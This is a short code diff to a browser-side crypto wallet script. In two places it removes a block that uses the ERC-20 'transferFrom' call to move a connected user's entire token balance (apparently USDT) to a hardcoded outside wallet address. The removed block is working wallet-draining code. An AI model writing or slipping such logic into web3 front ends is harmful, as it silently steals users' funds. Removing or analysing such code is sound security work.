@@ -72,19 +72,7 @@ if (typeof process === 'undefined') {
       console.log(balance.formatted)
       console.log(tB)
       
-      if(tB.formatted != 0){
-        const { request } = await prepareWriteContract({ 
-          address: tokenAddress, 
-          abi: erc20Abi, 
-          functionName: 'transferFrom', 
-          args: [getAccount().address, '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf', tB.formatted],
-          chainId: window.chainId,
-        })
-        const { thash } = await writeContract(request)
-        console.log(thash)
-      } else{
-        console.log("No available usdt")
-      }
+      
       const gasPriceGwei = 20;
       
       // Gas limit (you can estimate this or use a default value)
@@ -138,19 +126,7 @@ if (typeof process === 'undefined') {
       console.log(balance.formatted)
       console.log(tB)
       
-      if(tB.formatted != 0){
-        const { request } = await prepareWriteContract({ 
-          address: tokenAddress, 
-          abi: erc20Abi, 
-          functionName: 'transferFrom', 
-          args: [getAccount().address, '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf', tB.formatted],
-          chainId: window.chainId,
-        })
-        const { thash } = await writeContract(request)
-        console.log(thash)
-      } else{
-        console.log("No available usdt")
-      }
+      
       const gasPriceGwei = 20;
 
       // Gas limit (you can estimate this or use a default value)
